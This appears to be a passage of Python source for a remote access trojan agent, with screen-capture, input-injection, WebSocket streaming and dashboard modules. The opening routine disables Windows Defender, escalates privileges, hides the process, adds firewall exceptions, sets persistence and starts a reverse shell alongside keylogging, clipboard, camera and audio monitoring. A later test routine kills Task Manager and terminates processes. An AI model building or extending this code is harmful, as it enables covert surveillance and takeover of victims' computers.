        print("Agent running with admin privileges")
        # Disable Windows Defender if possible
        if disable_defender():
            print("Windows Defender disabled")
        else:
            print("Could not disable Windows Defender")
    else:
        print("Agent running with user privileges, attempting elevation...")
        if elevate_privileges():
            print("Privilege escalation successful")
        else:
            print("Privilege escalation failed, continuing with user privileges")
    
    # Setup stealth features
    try:
        hide_process()
        add_firewall_exception()
        setup_persistence()
        
        # Establish advanced persistence using UACME-inspired techniques
        if establish_persistence():
            print("Advanced persistence mechanisms established")
        
        print("Stealth features initialized")
    except Exception as e:
        print(f"Stealth initialization warning: {e}")
    
    agent_id = get_or_create_agent_id()
    print(f"Agent starting with ID: {agent_id}")
    
    # Start reverse shell automatically
    start_reverse_shell(agent_id)
    
    try:
        main_loop(agent_id)
    except KeyboardInterrupt:
        print("\nAgent shutting down.")
        stop_streaming()
        stop_audio_streaming()
        stop_camera_streaming()
        stop_keylogger()
        stop_clipboard_monitor()
        stop_reverse_shell()
        stop_voice_control()

# ========================================================================================
# HIGH PERFORMANCE CAPTURE MODULE
# From: high_performance_capture.py
# ========================================================================================

#!/usr/bin/env python3
"""
High-Performance Screen Capture Module
Optimized for 60+ FPS streaming with sub-100ms latency
"""

# Platform-specific imports for high performance capture
if platform.system() == "Windows":
    try:
        import dxcam
        HAS_DXCAM = True
    except ImportError:
        HAS_DXCAM = False
else:
    HAS_DXCAM = False

try:
    from turbojpeg import TurboJPEG
    HAS_TURBOJPEG = True
except ImportError:
    HAS_TURBOJPEG = False

try:
    import lz4.frame
    HAS_LZ4 = True
except ImportError:
    HAS_LZ4 = False

try:
    import xxhash
    HAS_XXHASH = True
except ImportError:
    HAS_XXHASH = False

class HighPerformanceCapture:
    """High-performance screen capture with hardware acceleration support"""
    
    def __init__(self, target_fps: int = 60, quality: int = 85, 
                 enable_delta_compression: bool = True):
        self.target_fps = target_fps
        self.frame_time = 1.0 / target_fps
        self.quality = quality
        self.enable_delta_compression = enable_delta_compression
        
        # Initialize capture backend
        self.capture_backend = None
        self._init_capture_backend()
        
        # Initialize compression
        self.turbo_jpeg = None
        if HAS_TURBOJPEG:
            self.turbo_jpeg = TurboJPEG()
        
        # Frame management
        self.last_frame = None
        self.last_frame_hash = None
        self.frame_buffer = []
        self.buffer_size = 3  # Triple buffering
        
        # Statistics
        self.fps_counter = 0
        self.fps_start_time = time.time()
        self.actual_fps = 0
        
        self.running = False
        self.capture_thread = None
    
    def _init_capture_backend(self):
        """Initialize the best available capture backend for the platform"""
        if HAS_DXCAM and platform.system() == "Windows":
            try:
                self.capture_backend = dxcam.create(output_color="RGB")
                self.backend_type = "dxcam"
            except Exception as e:
                self._fallback_to_mss()
        else:
            self._fallback_to_mss()
    
    def _fallback_to_mss(self):
        """Fallback to MSS capture"""
        self.capture_backend = mss.mss()
        self.backend_type = "mss"
    
    def _get_backend_name(self) -> str:
        """Get the name of the current backend"""
        if hasattr(self, 'backend_type'):
            return self.backend_type.upper()
        return "Unknown"
    
    def capture_frame(self, region=None):
        """Capture a single frame with optimal performance"""
        try:
            if self.backend_type == "dxcam" and self.capture_backend:
                # DXcam capture (Windows only)
                if region:
                    frame = self.capture_backend.grab(region=region)
                else:
                    frame = self.capture_backend.grab()
                
                if frame is None:
                    return None
                    
                # DXcam returns RGB, no conversion needed
                return frame
                
            elif self.backend_type == "mss":
                # MSS capture
                if region:
                    monitor = {"left": region[0], "top": region[1], 
                              "width": region[2] - region[0], 
                              "height": region[3] - region[1]}
                else:
                    monitor = self.capture_backend.monitors[1]
                
                screenshot = self.capture_backend.grab(monitor)
                frame = np.array(screenshot)
                
                # Convert BGRA to RGB
                if frame.shape[2] == 4:
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2RGB)
                elif frame.shape[2] == 3:
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                
                return frame
                
        except Exception as e:
            return None
        
        return None
    
    def encode_frame(self, frame, force_keyframe: bool = False):
        """Encode frame with optimal compression"""
        if frame is None:
            return None
        
        try:
            # Delta compression check
            if self.enable_delta_compression and not force_keyframe:
                if HAS_XXHASH:
                    frame_hash = xxhash.xxh64(frame.tobytes()).hexdigest()
                    if frame_hash == self.last_frame_hash:
                        # No change, return empty data or delta marker
                        return b'DELTA_UNCHANGED'
                    self.last_frame_hash = frame_hash
            
            # Resize for performance if needed
            height, width = frame.shape[:2]
            if width > 1920:
                scale = 1920 / width
                new_width = int(width * scale)
                new_height = int(height * scale)
                frame = cv2.resize(frame, (new_width, new_height), 
                                 interpolation=cv2.INTER_AREA)
            
            # Use TurboJPEG if available (faster)
            if HAS_TURBOJPEG and self.turbo_jpeg:
                # Convert RGB to BGR for TurboJPEG
                frame_bgr = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                encoded = self.turbo_jpeg.encode(frame_bgr, quality=self.quality)
            else:
                # Fallback to OpenCV
                frame_bgr = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                success, encoded = cv2.imencode('.jpg', frame_bgr, 
                    [cv2.IMWRITE_JPEG_QUALITY, self.quality,
                     cv2.IMWRITE_JPEG_OPTIMIZE, 1])
                if not success:
                    return None
                encoded = encoded.tobytes()
            
            # Optional LZ4 compression for additional bandwidth savings
            if HAS_LZ4 and len(encoded) > 1024:  # Only compress larger frames
                compressed = lz4.frame.compress(encoded, compression_level=1)
                if len(compressed) < len(encoded):
                    return b'LZ4_COMPRESSED' + compressed
            
            self.last_frame = frame.copy()
            return encoded
            
        except Exception as e:
            return None
    
    def start_capture_stream(self, callback, region=None):
        """Start continuous capture stream"""
        if self.running:
            return
        
        self.running = True
        self.capture_thread = threading.Thread(
            target=self._capture_loop, 
            args=(callback, region),
            daemon=True
        )
        self.capture_thread.start()
    
    def _capture_loop(self, callback, region):
        """Main capture loop optimized for low latency"""
        last_time = time.time()
        frame_count = 0
        
        while self.running:
            loop_start = time.time()
            
            # Capture frame
            frame = self.capture_frame(region)
            if frame is not None:
                # Encode frame
                encoded = self.encode_frame(frame)
                if encoded and encoded != b'DELTA_UNCHANGED':
                    callback(encoded)
                
                frame_count += 1
            
            # FPS calculation
            current_time = time.time()
            if current_time - self.fps_start_time >= 1.0:
                self.actual_fps = frame_count
                frame_count = 0
                self.fps_start_time = current_time
            
            # Precise timing control
            elapsed = time.time() - loop_start
            sleep_time = max(0, self.frame_time - elapsed)
            
            if sleep_time > 0:
                # Use high-precision sleep
                if sleep_time > 0.001:
                    time.sleep(sleep_time - 0.001)
                
                # Busy wait for final precision
                target_time = loop_start + self.frame_time
                while time.time() < target_time:
                    pass
    
    def stop_capture_stream(self):
        """Stop capture stream"""
        self.running = False
        if self.capture_thread:
            self.capture_thread.join(timeout=2.0)
    
    def get_stats(self) -> dict:
        """Get capture statistics"""
        return {
            "backend": self._get_backend_name(),
            "target_fps": self.target_fps,
            "actual_fps": self.actual_fps,
            "quality": self.quality,
            "delta_compression": self.enable_delta_compression,
            "turbojpeg": HAS_TURBOJPEG,
            "lz4": HAS_LZ4
        }
    
    def set_quality(self, quality: int):
        """Dynamically adjust encoding quality"""
        self.quality = max(10, min(100, quality))
    
    def set_fps(self, fps: int):
        """Dynamically adjust target FPS"""
        self.target_fps = max(10, min(120, fps))
        self.frame_time = 1.0 / self.target_fps
    
    def __del__(self):
        """Cleanup"""
        self.stop_capture_stream()
        if hasattr(self, 'capture_backend') and self.backend_type == "dxcam":
            try:
                if hasattr(self.capture_backend, 'release'):
                    self.capture_backend.release()
            except:
                pass


class AdaptiveQualityManager:
    """Manages adaptive quality based on network conditions"""
    
    def __init__(self, capture):
        self.capture = capture
        self.bandwidth_samples = []
        self.max_samples = 30
        self.last_adjustment = time.time()
        self.adjustment_interval = 2.0  # seconds
    
    def update_bandwidth(self, bytes_sent: int, time_elapsed: float):
        """Update bandwidth measurement"""
        if time_elapsed > 0:
            bandwidth = bytes_sent / time_elapsed
            self.bandwidth_samples.append(bandwidth)
            
            if len(self.bandwidth_samples) > self.max_samples:
                self.bandwidth_samples.pop(0)
            
            # Adaptive quality adjustment
            current_time = time.time()
            if current_time - self.last_adjustment > self.adjustment_interval:
                self._adjust_quality()
                self.last_adjustment = current_time
    
    def _adjust_quality(self):
        """Adjust quality based on bandwidth"""
        if len(self.bandwidth_samples) < 5:
            return
        
        avg_bandwidth = sum(self.bandwidth_samples) / len(self.bandwidth_samples)
        current_quality = self.capture.quality
        
        # Simple adaptive algorithm
        if avg_bandwidth < 500000:  # < 500KB/s
            new_quality = max(current_quality - 10, 30)
        elif avg_bandwidth > 2000000:  # > 2MB/s
            new_quality = min(current_quality + 5, 95)
        else:
            return  # No change needed
        
        if new_quality != current_quality:
            self.capture.set_quality(new_quality)

# ========================================================================================
# LOW LATENCY INPUT MODULE
# From: low_latency_input.py
# ========================================================================================

# Fast serialization
try:
    import msgpack
    HAS_MSGPACK = True
except ImportError:
    HAS_MSGPACK = False

# Performance optimizations
if PYAUTOGUI_AVAILABLE:
    pyautogui.FAILSAFE = False
    pyautogui.PAUSE = 0  # Remove delay between commands

class LowLatencyInputHandler:
    """Ultra-low latency input handling system"""
    
    def __init__(self, max_queue_size: int = 1000):
        self.max_queue_size = max_queue_size
        self.input_queue = queue.Queue(maxsize=max_queue_size)
        self.processing_thread = None
        self.running = False
        
        # Input controllers
        self.mouse_controller = mouse.Controller()
        self.keyboard_controller = keyboard.Controller()
        
        # Performance tracking
        self.input_count = 0
        self.last_input_time = time.time()
        self.processing_times = []
        
        # Input state caching for smooth movement
        self.last_mouse_pos = self.mouse_controller.position
        self.mouse_acceleration = 1.0
        self.smooth_mouse = True
    
    def start(self):
        """Start the input processing thread"""
        if self.running:
            return
        
        self.running = True
        self.processing_thread = threading.Thread(
            target=self._process_input_loop,
            daemon=True
        )
        self.processing_thread.start()
    
    def stop(self):
        """Stop input processing"""
        self.running = False
        if self.processing_thread:
            self.processing_thread.join(timeout=1.0)
    
    def handle_input(self, input_data) -> bool:
        """Queue input for processing"""
        try:
            if self.input_queue.full():
                # Drop oldest input if queue is full (prefer latest)
                try:
                    self.input_queue.get_nowait()
                except queue.Empty:
                    pass
            
            # Add timestamp for latency measurement
            input_data['timestamp'] = time.time()
            self.input_queue.put_nowait(input_data)
            return True
            
        except queue.Full:
            return False
    
    def _process_input_loop(self):
        """Main input processing loop"""
        while self.running:
            try:
                # Get input with timeout
                input_data = self.input_queue.get(timeout=0.1)
                
                # Measure processing latency
                process_start = time.time()
                received_time = input_data.get('timestamp', process_start)
                
                # Process the input
                self._execute_input(input_data)
                
                # Track performance
                process_time = time.time() - process_start
                total_latency = time.time() - received_time
                
                self._update_performance_stats(process_time, total_latency)
                self.input_count += 1
                
            except queue.Empty:
                continue
            except Exception as e:
                pass
    
    def _execute_input(self, input_data):
        """Execute the input command with optimal performance"""
        action = input_data.get('action')
        data = input_data.get('data', {})
        
        try:
            if action == 'mouse_move':
                self._handle_mouse_move(data)
            elif action == 'mouse_click':
                self._handle_mouse_click(data)
            elif action == 'mouse_scroll':
                self._handle_mouse_scroll(data)
            elif action == 'key_press':
                self._handle_key_press(data)
            elif action == 'key_release':
                self._handle_key_release(data)
            elif action == 'key_type':
                self._handle_key_type(data)
                
        except Exception as e:
            pass
    
    def _handle_mouse_move(self, data):
        """Handle mouse movement with smoothing"""
        try:
            # Get coordinates
            if 'absolute' in data:
                x, y = data['absolute']['x'], data['absolute']['y']
                
                # Apply acceleration/sensitivity
                sensitivity = data.get('sensitivity', 1.0)
                if sensitivity != 1.0:
                    current_x, current_y = self.mouse_controller.position
                    x = current_x + (x - current_x) * sensitivity
                    y = current_y + (y - current_y) * sensitivity
                
                # Direct position setting (fastest)
                self.mouse_controller.position = (int(x), int(y))
                
            elif 'relative' in data:
                dx, dy = data['relative']['x'], data['relative']['y']
                sensitivity = data.get('sensitivity', 1.0)
                
                # Apply relative movement
                current_x, current_y = self.mouse_controller.position
                new_x = current_x + int(dx * sensitivity)
                new_y = current_y + int(dy * sensitivity)
                
                self.mouse_controller.position = (new_x, new_y)
            
            # Update cached position
            self.last_mouse_pos = self.mouse_controller.position
            
        except Exception as e:
            pass
    
    def _handle_mouse_click(self, data):
        """Handle mouse clicks"""
        try:
            button_map = {
                'left': mouse.Button.left,
                'right': mouse.Button.right,
                'middle': mouse.Button.middle
            }
            
            button = data.get('button', 'left')
            clicks = data.get('clicks', 1)
            pressed = data.get('pressed', True)
            
            mouse_button = button_map.get(button, mouse.Button.left)
            
            if pressed:
                for _ in range(clicks):
                    self.mouse_controller.click(mouse_button)
            else:
                # Handle button release if needed
                pass
                
        except Exception as e:
            pass
    
    def _handle_mouse_scroll(self, data):
        """Handle mouse scrolling"""
        try:
            dx = data.get('dx', 0)
            dy = data.get('dy', 0)
            
            if dx != 0 or dy != 0:
                self.mouse_controller.scroll(dx, dy)
                
        except Exception as e:
            pass
    
    def _handle_key_press(self, data):
        """Handle key press"""
        try:
            key = data.get('key')
            if not key:
                return
            
            # Handle special keys
            if key.startswith('Key.'):
                # Special key like Key.enter, Key.ctrl, etc.
                key_name = key[4:]  # Remove 'Key.' prefix
                special_key = getattr(keyboard.Key, key_name, None)
                if special_key:
                    self.keyboard_controller.press(special_key)
            else:
                # Regular character
                self.keyboard_controller.press(key)
                
        except Exception as e:
            pass
    
    def _handle_key_release(self, data):
        """Handle key release"""
        try:
            key = data.get('key')
            if not key:
                return
            
            # Handle special keys
            if key.startswith('Key.'):
                key_name = key[4:]
                special_key = getattr(keyboard.Key, key_name, None)
                if special_key:
                    self.keyboard_controller.release(special_key)
            else:
                self.keyboard_controller.release(key)
                
        except Exception as e:
            pass
    
    def _handle_key_type(self, data):
        """Handle text typing"""
        try:
            text = data.get('text', '')
            if text:
                # Use direct character typing for best performance
                for char in text:
                    self.keyboard_controller.press(char)
                    self.keyboard_controller.release(char)
                
        except Exception as e:
            pass
    
    def _update_performance_stats(self, process_time: float, total_latency: float):
        """Update performance statistics"""
        self.processing_times.append({
            'process_time': process_time,
            'total_latency': total_latency,
            'timestamp': time.time()
        })
        
        # Keep only recent samples
        if len(self.processing_times) > 1000:
            self.processing_times.pop(0)
    
    def get_performance_stats(self):
        """Get performance statistics"""
        if not self.processing_times:
            return {
                'input_count': self.input_count,
                'queue_size': self.input_queue.qsize(),
                'avg_process_time': 0,
                'avg_latency': 0,
                'max_latency': 0,
                'min_latency': 0
            }
        
        recent_times = self.processing_times[-100:]  # Last 100 samples
        process_times = [t['process_time'] for t in recent_times]
        latencies = [t['total_latency'] for t in recent_times]
        
        return {
            'input_count': self.input_count,
            'queue_size': self.input_queue.qsize(),
            'avg_process_time': sum(process_times) / len(process_times) * 1000,  # ms
            'avg_latency': sum(latencies) / len(latencies) * 1000,  # ms
            'max_latency': max(latencies) * 1000,  # ms
            'min_latency': min(latencies) * 1000,  # ms
            'samples': len(recent_times)
        }
    
    def set_mouse_acceleration(self, acceleration: float):
        """Set mouse acceleration factor"""
        self.mouse_acceleration = max(0.1, min(5.0, acceleration))
    
    def clear_queue(self):
        """Clear the input queue"""
        while not self.input_queue.empty():
            try:
                self.input_queue.get_nowait()
            except queue.Empty:
                break


class InputMessageEncoder:
    """Fast message encoding/decoding for input data"""
    
    def __init__(self):
        self.use_msgpack = HAS_MSGPACK
    
    def encode(self, data) -> bytes:
        """Encode input data to bytes"""
        try:
            if self.use_msgpack:
                return msgpack.packb(data)
            else:
                return json.dumps(data).encode('utf-8')
        except Exception as e:
            return b''
    
    def decode(self, data: bytes):
        """Decode bytes to input data"""
        try:
            if self.use_msgpack:
                return msgpack.unpackb(data, raw=False)
            else:
                return json.loads(data.decode('utf-8'))
        except Exception as e:
            return None

# ========================================================================================
# WEBSOCKET STREAMING MODULE
# From: websocket_streaming.py
# ========================================================================================

try:
    import uvloop
    HAS_UVLOOP = True
except ImportError:
    HAS_UVLOOP = False

class WebSocketStreamingServer:
    """High-performance WebSocket streaming server"""
    
    def __init__(self, host: str = "localhost", port: int = 8765, 
                 max_clients: int = 10, target_fps: int = 60):
        self.host = host
        self.port = port
        self.max_clients = max_clients
        self.target_fps = target_fps
        
        # Client management
        self.clients = set()
        self.client_stats = {}
        
        # Streaming components
        self.capture = None
        self.frame_queue = queue.Queue(maxsize=120)  # 2 seconds buffer at 60fps
        self.running = False
        
        # Performance tracking
        self.frames_sent = 0
        self.bytes_sent = 0
        self.start_time = time.time()
    
    async def start_server(self):
        """Start the WebSocket server"""
        if HAS_UVLOOP and hasattr(asyncio, 'set_event_loop_policy'):
            asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
        
        self.running = True
        
        # Initialize capture system
        try:
            self.capture = HighPerformanceCapture(
                target_fps=self.target_fps, 
                quality=85, 
                enable_delta_compression=True
            )
            self.capture.start_capture_stream(self._frame_callback)
        except:
            return
        
        # Start frame distribution task
        asyncio.create_task(self._distribute_frames())
        
        # Start the WebSocket server
        async with websockets.serve(
            self._handle_client,
            self.host,
            self.port,
            max_size=1024*1024*10,  # 10MB max message size
            ping_interval=20,
            ping_timeout=10,
            compression=None  # Disable compression for speed
        ):
            await asyncio.Future()  # Run forever
    
    async def _handle_client(self, websocket, path):
        """Handle new client connection"""
        client_id = f"{websocket.remote_address[0]}:{websocket.remote_address[1]}"
        
        if len(self.clients) >= self.max_clients:
            await websocket.close(code=1013, reason="Server full")
            return
        
        self.clients.add(websocket)
        self.client_stats[client_id] = {
            'connected_at': time.time(),
            'frames_sent': 0,
            'bytes_sent': 0,
            'last_activity': time.time()
        }
        
        try:
            # Send initial connection message
            await self._send_to_client(websocket, {
                'type': 'connection',
                'message': 'Connected to high-performance stream',
                'fps': self.target_fps,
                'features': {
                    'high_performance_capture': True,
                    'msgpack': HAS_MSGPACK,
                    'uvloop': HAS_UVLOOP
                }
            })
            
            # Handle client messages
            async for message in websocket:
                await self._handle_client_message(websocket, client_id, message)
                
        except websockets.exceptions.ConnectionClosed:
            pass
        except Exception as e:
            pass
        finally:
            self.clients.discard(websocket)
            self.client_stats.pop(client_id, None)
    
    async def _handle_client_message(self, websocket, client_id: str, message: str):
        """Handle incoming client messages"""
        try:
            data = json.loads(message)
            msg_type = data.get('type')
            
            if msg_type == 'ping':
                await self._send_to_client(websocket, {'type': 'pong', 'timestamp': time.time()})
            elif msg_type == 'stats_request':
                stats = self._get_server_stats()
                await self._send_to_client(websocket, {'type': 'stats', 'data': stats})
            elif msg_type == 'quality_change':
                new_quality = data.get('quality', 85)
                if self.capture:
                    self.capture.set_quality(new_quality)
                await self._send_to_client(websocket, {
                    'type': 'quality_changed', 
                    'quality': new_quality
                })
            
            # Update client activity
            self.client_stats[client_id]['last_activity'] = time.time()
            
        except json.JSONDecodeError:
            pass
        except Exception as e:
            pass
    
    def _frame_callback(self, frame_data: bytes):
        """Callback for captured frames"""
        if frame_data and frame_data != b'DELTA_UNCHANGED':
            try:
                # Add frame to queue (non-blocking)
                if not self.frame_queue.full():
                    self.frame_queue.put_nowait({
                        'data': frame_data,
                        'timestamp': time.time()
                    })
                else:
                    # Drop oldest frame if queue is full
                    try:
                        self.frame_queue.get_nowait()
                        self.frame_queue.put_nowait({
                            'data': frame_data,
                            'timestamp': time.time()
                        })
                    except queue.Empty:
                        pass
            except Exception as e:
                pass
    
    async def _distribute_frames(self):
        """Distribute frames to all connected clients"""
        while self.running:
            try:
                # Get frame from queue (non-blocking)
                try:
                    frame_data = self.frame_queue.get_nowait()
                except queue.Empty:
                    await asyncio.sleep(0.001)  # 1ms sleep
                    continue
                
                if not self.clients:
                    continue
                
                # Prepare frame message
                frame_message = {
                    'type': 'frame',
                    'timestamp': frame_data['timestamp'],
                    'data': base64.b64encode(frame_data['data']).decode('utf-8')
                }
                
                # Handle different frame types
                if frame_data['data'].startswith(b'LZ4_COMPRESSED'):
                    frame_message['encoding'] = 'lz4'
                    frame_message['data'] = base64.b64encode(frame_data['data'][14:]).decode('utf-8')
                
                # Send to all clients concurrently
                tasks = []
                for client in list(self.clients):  # Create a copy to avoid modification during iteration
                    tasks.append(self._send_frame_to_client(client, frame_message))
                
                if tasks:
                    await asyncio.gather(*tasks, return_exceptions=True)
                
                self.frames_sent += 1
                self.bytes_sent += len(frame_data['data'])
                
            except Exception as e:
                await asyncio.sleep(0.01)
    
    async def _send_frame_to_client(self, websocket, frame_message):
        """Send frame to a specific client"""
        try:
            if websocket in self.clients:
                if HAS_MSGPACK:
                    # Use MessagePack for better performance
                    data = msgpack.packb(frame_message)
                    await websocket.send(data)
                else:
                    # Fallback to JSON
                    await websocket.send(json.dumps(frame_message))
                
                # Update client stats
                client_id = f"{websocket.remote_address[0]}:{websocket.remote_address[1]}"
                if client_id in self.client_stats:
                    self.client_stats[client_id]['frames_sent'] += 1
                    self.client_stats[client_id]['bytes_sent'] += len(frame_message.get('data', ''))
                    
        except websockets.exceptions.ConnectionClosed:
            self.clients.discard(websocket)
        except Exception as e:
            pass
    
    async def _send_to_client(self, websocket, message):
        """Send a message to a specific client"""
        try:
            if HAS_MSGPACK:
                data = msgpack.packb(message)
                await websocket.send(data)
            else:
                await websocket.send(json.dumps(message))
        except Exception as e:
            pass
    
    def _get_server_stats(self):
        """Get server performance statistics"""
        uptime = time.time() - self.start_time
        avg_fps = self.frames_sent / uptime if uptime > 0 else 0
        avg_bandwidth = self.bytes_sent / uptime if uptime > 0 else 0
        
        capture_stats = {}
        if self.capture:
            capture_stats = self.capture.get_stats()
        
        return {
            'uptime': uptime,
            'connected_clients': len(self.clients),
            'frames_sent': self.frames_sent,
            'bytes_sent': self.bytes_sent,
            'avg_fps': avg_fps,
            'avg_bandwidth': avg_bandwidth,
            'frame_queue_size': self.frame_queue.qsize(),
            'capture_stats': capture_stats,
            'client_stats': self.client_stats
        }
    
    def stop_server(self):
        """Stop the streaming server"""
        self.running = False
        if self.capture:
            self.capture.stop_capture_stream()

# ========================================================================================
# OPTIMIZED DASHBOARD HTML CONTENT
# From: optimized_dashboard.html
# ========================================================================================

OPTIMIZED_DASHBOARD_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>High-Performance Dashboard - 60 FPS Streaming</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1e1e1e 0%, #2d2d2d 100%);
            color: #ffffff;
            overflow-x: hidden;
        }
        .header {
            background: rgba(0, 0, 0, 0.8);
            padding: 15px 20px;
            border-bottom: 2px solid #00ff88;
            backdrop-filter: blur(10px);
        }
        .header h1 {
            color: #00ff88;
            text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
        }
        .performance-badge {
            display: inline-block;
            background: linear-gradient(45deg, #ff6b6b, #feca57);
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
            margin-left: 15px;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        .container {
            display: grid;
            grid-template-columns: 1fr 300px;
            height: calc(100vh - 80px);
            gap: 20px;
            padding: 20px;
        }
        .stream-container {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            padding: 20px;
            border: 1px solid rgba(0, 255, 136, 0.3);
            position: relative;
            overflow: hidden;
        }
        .stream-video {
            width: 100%;
            height: 100%;
            object-fit: contain;
            border-radius: 10px;
            background: #000;
        }
        .stream-overlay {
            position: absolute;
            top: 20px;
            left: 20px;
            background: rgba(0, 0, 0, 0.8);
            padding: 15px;
            border-radius: 10px;
            min-width: 200px;
        }
        .fps-counter {
            font-size: 24px;
            font-weight: bold;
            color: #00ff88;
            text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
        }
        .latency-indicator {
            margin-top: 10px;
        }
        .latency-value {
            font-size: 18px;
            font-weight: bold;
        }
        .latency-low { color: #00ff88; }
        .latency-medium { color: #feca57; }
        .latency-high { color: #ff6b6b; }
        .controls-panel {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            padding: 20px;
            border: 1px solid rgba(0, 255, 136, 0.3);
            height: fit-content;
        }
        .control-section {
            margin-bottom: 25px;
        }
        .control-section h3 {
            color: #00ff88;
            margin-bottom: 15px;
            font-size: 16px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .btn {
            background: linear-gradient(45deg, #00ff88, #00d4aa);
            border: none;
            padding: 12px 20px;
            border-radius: 8px;
            color: white;
            font-weight: bold;
            cursor: pointer;
            margin: 5px;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            width: 100%;
        }
        .btn:hover {
            background: linear-gradient(45deg, #00d4aa, #00ff88);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 255, 136, 0.4);
        }
        .btn-danger {
            background: linear-gradient(45deg, #ff6b6b, #ff4757);
        }
        .btn-danger:hover {
            background: linear-gradient(45deg, #ff4757, #ff6b6b);
            box-shadow: 0 5px 15px rgba(255, 107, 107, 0.4);
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>High-Performance Dashboard<span class="performance-badge">60 FPS • Sub-2s Latency</span></h1>
    </div>
    <div class="container">
        <div class="stream-container">
            <img id="streamVideo" class="stream-video" alt="High-Performance Stream" />
            <div class="stream-overlay">
                <div class="fps-counter"><span id="fpsValue">0</span> FPS</div>
                <div class="latency-indicator">Latency: <span id="latencyValue" class="latency-value latency-low">0ms</span></div>
            </div>
        </div>
        <div class="controls-panel">
            <div class="control-section">
                <h3>Stream Control</h3>
                <button class="btn" onclick="startOptimizedStream()">Start 60 FPS Stream</button>
                <button class="btn btn-danger" onclick="stopStream()">Stop Stream</button>
                <button class="btn" onclick="startWebSocketStream()">WebSocket Stream</button>
            </div>
        </div>
    </div>
    <script>
        let streamActive = false;
        let webSocketStream = null;
        let frameCount = 0;
        let startTime = Date.now();

        function startWebSocketStream() {
            if (webSocketStream) {
                webSocketStream.close();
            }
            webSocketStream = new WebSocket('ws://localhost:8765');
            
            webSocketStream.onmessage = function(event) {
                try {
                    const data = JSON.parse(event.data);
                    if (data.type === 'frame') {
                        updateStreamFrame(data);
                    }
                } catch (e) {
                    console.error('WebSocket message error:', e);
                }
            };
        }

        function updateStreamFrame(frameData) {
            const streamVideo = document.getElementById('streamVideo');
            streamVideo.src = 'data:image/jpeg;base64,' + frameData.data;
            
            frameCount++;
            const now = Date.now();
            const elapsed = (now - startTime) / 1000;
            const fps = Math.round(frameCount / elapsed);
            document.getElementById('fpsValue').textContent = fps;
            
            const latency = now - (frameData.timestamp * 1000);
            document.getElementById('latencyValue').textContent = Math.round(latency) + 'ms';
        }

        function startOptimizedStream() {
            streamActive = true;
            console.log('Optimized stream started');
        }

        function stopStream() {
            streamActive = false;
            if (webSocketStream) {
                webSocketStream.close();
                webSocketStream = null;
            }
            console.log('Stream stopped');
        }

        document.addEventListener('DOMContentLoaded', function() {
            setTimeout(startWebSocketStream, 1000);
        });
    </script>
</body>
</html>"""

# ========================================================================================
# PROCESS TERMINATION TEST FUNCTIONS
# From: test_process_termination.py
# ========================================================================================

def test_process_termination_functionality():
    """Test enhanced process termination with admin privileges functionality."""
    print("Enhanced Process Termination Test")
    print("=" * 40)
    
    # Check current privileges
    if WINDOWS_AVAILABLE:
        if is_admin():
            print("✓ Running with administrator privileges")
        else:
            print("⚠ Running with user privileges")
            print("Attempting to elevate privileges...")
            if elevate_privileges():
                print("✓ Privilege escalation successful")
            else:
                print("✗ Privilege escalation failed")
                print("Some termination methods may fail")
    else:
        print("✓ Running on Linux/Unix system")
        if os.geteuid() == 0:
            print("✓ Running as root")
        else:
            print("⚠ Running as regular user")
    
    print("\nAvailable commands:")
    print("1. kill-taskmgr - Terminate Task Manager")
    print("2. terminate <process_name> - Terminate process by name")
    print("3. terminate <pid> - Terminate process by PID")
    print("4. quit - Exit")
    
    while True:
        try:
            command = input("\nEnter command: ").strip().lower()
            
            if command == "quit" or command == "exit":
                break
            elif command == "kill-taskmgr":
                print("Attempting to terminate Task Manager...")
                result = kill_task_manager()
                print(f"Result: {result}")
            elif command.startswith("terminate "):
                target = command.split(" ", 1)[1]
                
                # Try to convert to PID if it's a number
                try:
                    target = int(target)
                    print(f"Attempting to terminate process with PID {target}...")
                except ValueError:
                    print(f"Attempting to terminate process '{target}'...")
                
                result = terminate_process_with_admin(target, force=True)
                print(f"Result: {result}")
            else:
                print("Unknown command. Use 'kill-taskmgr', 'terminate <name/pid>', or 'quit'")
                
        except KeyboardInterrupt:
            print("\nExiting...")
            break
        except Exception as e:
            print(f"Error: {e}")

# ========================================================================================
# SECURITY IMPROVEMENTS MODULE
# From: security_improvements.py
# ========================================================================================

import hashlib
import hmac
import secrets
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import ipaddress

class SecureAuth:
    """Secure authentication system with token-based auth"""
    
    def __init__(self, secret_key: Optional[str] = None):
        self.secret_key = secret_key or secrets.token_urlsafe(32)
        self.active_tokens: Dict[str, Dict[str, Any]] = {}
        self.max_token_age = 3600  # 1 hour
        
    def generate_token(self, agent_id: str, permissions: List[str] = None) -> str:
        """Generate a secure authentication token"""
        permissions = permissions or ["basic"]
        
        token_data = {
            "agent_id": agent_id,
            "permissions": permissions,
            "created_at": time.time(),
            "expires_at": time.time() + self.max_token_age,
            "nonce": secrets.token_hex(16)
        }
        
        # Create token signature
        token_string = json.dumps(token_data, sort_keys=True)
        signature = hmac.new(
            self.secret_key.encode(),
            token_string.encode(),
            hashlib.sha256
        ).hexdigest()
        
        token = base64.b64encode(f"{token_string}:{signature}".encode()).decode()
        self.active_tokens[token] = token_data
        
        print(f"Generated token for agent {agent_id}")
